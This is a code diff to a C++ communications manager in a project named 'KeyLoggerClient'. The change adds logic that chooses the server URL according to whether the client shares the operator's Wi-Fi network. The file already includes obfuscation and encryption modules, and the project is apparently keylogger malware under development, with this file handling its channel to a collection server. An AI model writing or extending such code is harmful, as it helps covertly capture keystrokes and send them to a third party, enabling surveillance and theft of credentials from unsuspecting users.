@@ -1,4 +1,4 @@
-// src/communication/CommsManager.cpp
+// KeyLoggerClient/src/communication/CommsManager.cpp
 #include "communication/CommsManager.h"
 #include "communication/HttpComms.h"
 #include "communication/FtpComms.h"
@@ -7,6 +7,8 @@
 #include "core/Configuration.h"
 #include "security/Obfuscation.h"
 #include "security/Encryption.h"
+#include "utils/NetworkUtils.h"
+#include "utils/DataUtils.h"
 #include <memory>
 #include <algorithm>
 
@@ -35,6 +37,26 @@ void CommsManager::InitializeCommsMethods() {
 
 bool CommsManager::Initialize() {
     std::string method = m_config->GetCommsMethod();
+    
+    // Determine which server URL to use based on network mode
+    std::string networkMode = m_config->GetNetworkMode();
+    std::string effectiveUrl;
+    
+    if (networkMode == "same_wifi") {
+        effectiveUrl = m_config->GetSameWifiServerUrl();
+    } else if (networkMode == "different_wifi") {
+        effectiveUrl = m_config->GetDifferentWifiServerUrl();
+    } else { // auto detection
+        if (NetworkUtils::IsOnLocalNetwork()) {
+            effectiveUrl = m_config->GetSameWifiServerUrl();
+        } else {
+            effectiveUrl = m_config->GetDifferentWifiServerUrl();
+        }
+    }
+    
+    // Temporarily override the server URL for this connection
+    m_config->SetValue("server_url", effectiveUrl);
+    
     auto it = m_commsMethods.find(method);
     
     if (it == m_commsMethods.end()) {
